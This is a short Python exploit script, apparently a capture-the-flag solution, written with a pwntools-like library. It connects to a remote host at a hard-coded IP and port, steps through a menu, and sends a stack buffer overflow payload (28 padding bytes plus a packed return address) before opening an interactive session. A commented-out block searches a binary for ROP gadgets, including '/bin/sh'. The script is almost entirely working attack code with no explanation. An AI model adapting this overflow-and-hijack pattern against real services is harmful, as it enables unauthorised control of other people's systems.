from pxwn import *

"""
#================================================
exp = Exploit("segsh",64)
gadget1 = exp.rop("prdi")
gadget2 = exp.rop("prsi")
gadget3 = exp.rop("ppr")
gadget4 = exp.rop("pppr")
gadget5 = exp.rop("ppppr")
gadget6 = exp.rop("/bin/sh")
gadget7 = exp.rop("leave")
#================================================
print "=" * 30
if gadget1 != "Gadgets Not Found!":
    print "pop rdi:" + hex(gadget1)
else:
    print gadget1

print "=" * 30


print "=" * 30

if gadget2 != "Gadgets Not Found!":
    for i in gadget2:
        print "pop rsi: " + hex(i.address)
        print "Gadget Name: " + i.simpleString()
else:
    print gadget2

print "=" * 30

if gadget3 != "Gadgets Not Found!":
    for i in gadget3:
        print "pop pop ret: " + hex(i.address)
        print "Gadget Name: " + i.simpleString()
else:
    print gadget3

print "=" * 30

print "=" * 30
if gadget4 != "Gadgets Not Found!":
    for i in gadget4:
            print "pop pop pop ret: " + hex(i.address)
        print "Gadget Name: " + i.simpleString()
else:
    print gadget4

print "=" * 30

print "=" * 30
if gadget5 != "Gadgets Not Found!":
    for i in gadget5:
        print "pop pop pop pop ret: " + hex(i.address)
        print "Gadget Name: " + i.simpleString()
else:
    print gadget5

print "=" * 30
"""
#=========================================================

local=False

if local:
    p = process("")
    pause()
    p.debug()
else:
    HOST = "128.238.66.213"
    PORT = 4444
    r = connect(HOST,PORT)
    pause()
    r.debug()

#=========================================================
for i in range(10):
    r.recvul("Exit")
    r.sendl("1")

r.recvul("//////////////////////////////////////////")
r.recvul("//////////////////////////////////////////")
r.sendl("A"*28+pk32(0x0804857d))
r.interactive()
